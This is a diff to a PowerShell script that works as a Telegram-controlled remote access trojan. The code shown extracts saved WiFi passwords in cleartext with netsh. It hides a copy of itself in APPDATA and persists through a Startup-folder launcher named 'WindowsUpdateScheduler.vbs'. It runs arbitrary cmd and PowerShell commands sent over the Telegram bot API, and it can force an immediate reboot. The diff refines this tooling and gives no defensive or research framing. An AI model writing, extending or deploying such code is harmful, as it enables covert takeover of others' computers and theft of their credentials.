@@ -218,17 +218,22 @@ C: Drive: $([math]::Round($disk.Size / 1GB, 2)) GB total, $([math]::Round($disk.
 
 function Get-WifiPasswords {
     try {
+        $originalLocation = Get-Location
+        Push-Location "C:\Windows\System32"  # or just "C:\"
         $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
-        
+        Pop-Location
+
         if (-not $profiles) {
             return "No WiFi profiles found."
         }
-        
+
         $results = "Saved WiFi Networks and Passwords:`n----------------------------------`n"
-        
+
         foreach ($profile in $profiles) {
-            $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" 
-            
+            Push-Location "C:\Windows\System32"
+            $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
+            Pop-Location
+
             if ($password) {
                 $pass = $password.ToString().Split(":")[1].Trim()
                 $results += "Network: $profile`nPassword: $pass`n`n"
@@ -236,7 +241,7 @@ function Get-WifiPasswords {
                 $results += "Network: $profile`nPassword: [No Password Found]`n`n"
             }
         }
-        
+
         return $results
     } catch {
         return "Error retrieving WiFi passwords: $_"
@@ -529,8 +534,8 @@ COMMAND EXECUTION
 
 # --- ALL FUNCTION DEFINITIONS END HERE ---
 
-$botToken = "urbot"
-$userId = "urID"
+$botToken = "urtoken"
+$userId = "urid"
 $apiUrl = "https://api.telegram.org/bot$botToken"
 $lastUpdateId = 0 # Initial default
 
@@ -571,9 +576,7 @@ $destinationPath = Join-Path $startupFolder $scriptName
 $vbsLauncherPath = Join-Path $startupFolder "WindowsUpdateScheduler.vbs"
 
 $hiddenScriptPath = "$env:APPDATA\Microsoft\Windows\$scriptName"
-if (-not (Test-Path $hiddenScriptPath)) {
-    Copy-Item -Path $scriptPath -Destination $hiddenScriptPath
-}
+Copy-Item -Path $scriptPath -Destination $hiddenScriptPath -Force
 
 $vbsContent = @"
 Set WshShell = CreateObject("WScript.Shell")
@@ -596,57 +599,63 @@ while ($true) {
 
 
 
-            if ($text -match "^cd\s+(.*)") {
-				$targetPath = $matches[1].Trim('"')
+            # Ensure CurrentDirectory is always initialized at the start of the loop
+            if (-not $global:CurrentDirectory -or $global:CurrentDirectory -eq "") {
+                $global:CurrentDirectory = (Get-Location).Path
+            }
 
-				# If the path is relative, resolve it against current directory
-				if (-not [System.IO.Path]::IsPathRooted($targetPath)) {
-					$targetPath = Join-Path $global:CurrentDirectory $targetPath
-				}
-
-				try {
-					if ($targetPath -like "\\*") {
-						# UNC path: use Push-Location temporarily to verify it exists
-						Push-Location $targetPath
-						Pop-Location
-						$global:CurrentDirectory = $targetPath
-						$reply = "Changed directory to UNC/network path: $targetPath"
-					}
-					elseif (Test-Path $targetPath -PathType Container) {
-						# Local path (includes OneDrive)
-						Set-Location $targetPath
-						$global:CurrentDirectory = (Resolve-Path $targetPath).Path
-						$reply = "Changed directory to: $global:CurrentDirectory"
-					}
-					else {
-						$reply = "Directory not found: $targetPath"
-					}
-				} catch {
-					$reply = "Failed to access directory: $_"
-				}
-			}
-			elseif ($text -match "^cd$") {
-				$reply = "Current directory: $global:CurrentDirectory"
-			}
-			elseif ($text -match "^(ls|dir)$") {
-				try {
-					$items = Get-ChildItem -Path $global:CurrentDirectory -Force
-					$reply = if ($items) {
-						$list = foreach ($item in $items) {
-							if ($item.PSIsContainer) {
-								"[Folder] $($item.Name)"
-							} else {
-								"[File]   $($item.Name)"
-							}
-						}
-						"Files and folders in $global:CurrentDirectory:`n" + ($list -join "`n")
-					} else {
-						"No files or folders found in $global:CurrentDirectory"
-					}
-				} catch {
-					$reply = "Error reading directory: $_"
-				}
-			}
+            if ($text -match "^cd\s+(.+)$") {
+                $targetPath = $matches[1].Trim('"').Trim()
+                if (-not [System.IO.Path]::IsPathRooted($targetPath)) {
+                    $targetPath = Join-Path $global:CurrentDirectory $targetPath
+                }
+                try {
+                    if ($targetPath -like "\\*") {
+                        Push-Location $targetPath
+                        Pop-Location
+                        $global:CurrentDirectory = $targetPath
+                        $reply = "Changed directory to UNC/network path: $targetPath"
+                    }
+                    elseif (Test-Path $targetPath -PathType Container) {
+                        Set-Location $targetPath
+                        $global:CurrentDirectory = (Resolve-Path $targetPath).Path
+                        $reply = "Changed directory to: $global:CurrentDirectory"
+                    }
+                    else {
+                        $reply = "Directory not found: $targetPath"
+                    }
+                } catch {
+                    $reply = "Failed to access directory: $_"
+                }
+            }
+            elseif ($text -match "^cd$") {
+                if (-not $global:CurrentDirectory -or $global:CurrentDirectory -eq "") {
+                    $global:CurrentDirectory = (Get-Location).Path
+                }
+                $reply = "Current directory: $global:CurrentDirectory"
+            }
+            elseif ($text -match "^(ls|dir)$") {
+                if (-not $global:CurrentDirectory -or $global:CurrentDirectory -eq "") {
+                    $global:CurrentDirectory = (Get-Location).Path
+                }
+                try {
+                    $items = Get-ChildItem -Path $global:CurrentDirectory -Force
+                    $reply = if ($items) {
+                        $list = foreach ($item in $items) {
+                            if ($item.PSIsContainer) {
+                                "[Folder] $($item.Name)"
+                            } else {
+                                "[File]   $($item.Name)"
+                            }
+                        }
+                        "Files and folders in $global:CurrentDirectory:`n" + ($list -join "`n")
+                    } else {
+                        "No files or folders found in $global:CurrentDirectory"
+                    }
+                } catch {
+                    $reply = "Error reading directory: $_"
+                }
+            }
             elseif ($text -eq "/help") {
                 Send-HelpMessage -chatId $chatId
                 continue
@@ -678,11 +687,8 @@ while ($true) {
                 continue
             }
             elseif ($text -eq "/confirm-restart") {
-                Send-TelegramMessage -chatId $chatId -message "Restarting system in 10 seconds. Please wait..."
-                Start-Sleep -Seconds 2
-                Start-Process -FilePath "shutdown.exe" -ArgumentList "/r /t 8"
-                $reply = "System will restart in 8 seconds."
-                exit
+                shutdown /r /t 0
+                $reply = "Restarting system..."
             }
             elseif ($text -eq "/shutdown") {
                 Send-TelegramMessage -chatId $chatId -message "Are you sure you want to shut down the system? Send '/confirm-shutdown' to confirm."
@@ -771,11 +777,13 @@ while ($true) {
                 $Command = $text -replace "^/cmd\s*", ""
                 $Result  = Run-LocalCommand $Command "cmd"
                 Send-TgMessage $chatId "CMD> $Command`n`n$Result"
+                continue
             }
             elseif ($text -like "/powershell*") {
                 $Command = $text -replace "^/powershell\s*", ""
                 $Result  = Run-LocalCommand $Command "powershell"
                 Send-TgMessage $chatId "PS> $Command`n`n$Result"
+                continue
             }
 			else {
 				$reply = "Unknown command."
